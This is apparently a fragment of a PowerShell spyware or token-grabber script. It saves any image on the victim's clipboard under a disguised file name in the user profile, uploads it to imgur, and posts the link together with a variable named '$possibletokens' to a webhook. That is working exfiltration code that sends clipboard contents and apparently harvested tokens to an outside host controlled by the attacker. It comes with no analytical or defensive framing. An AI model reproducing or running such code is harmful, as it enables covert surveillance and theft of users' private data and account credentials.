Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Collections
Add-Type -AssemblyName System.Net.Http
$clipboard = [System.Windows.Forms.Clipboard]::GetDataObject()
if ($clipboard.ContainsImage()) {
    $filename="$env:userprofile\WindowsServiceScreenshot.png"
    if (-not(Test-Path -Path $filename -PathType Leaf)) {
     try {
         New-Item -ItemType File -Path $filename -Force -ErrorAction Stop
     }
     catch {
         throw $_.Exception.Message
     }
 }
 else {
 }        
    [System.Drawing.Bitmap]$clipboard.getimage().Save($filename, [System.Drawing.Imaging.ImageFormat]::Png) 
    $imgPath = $filename #This is my sample image
    $ClientID = "$icid" #Enter the client ID you registered on imgur
    $imgInBase64 = [convert]::ToBase64String((get-content $imgPath -encoding byte))
    $upload = Invoke-WebRequest -UseBasicParsing -uri "https://api.imgur.com/3/image" -method POST -body $imgInBase64 -headers @{"Authorization" = "Client-ID $ClientID"}
    $Content = $upload.content|ConvertFrom-Json
    $link = $Content.data.link
    $webhookUrl = "$dc"
    [System.Collections.ArrayList]$embedArray = @()
    $title       = 'Windows Screenshotter Powershell'
    $description = $possibletokens | Out-String
    $color       = '000111'
    $imageObject = [PSCustomObject]@{ 
        url = $link
    }
    $embedObject = [PSCustomObject]@{
        title       = $title
        description = $description
        color       = $color
        image = $imageObject
    }
    $embedArray.Add($embedObject) | Out-Null
    $payload = [PSCustomObject]@{
        'username' = 'Windows Screenshotter'
        embeds = $embedArray   
    }
    Invoke-RestMethod -UseBasicParsing -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
} else {
}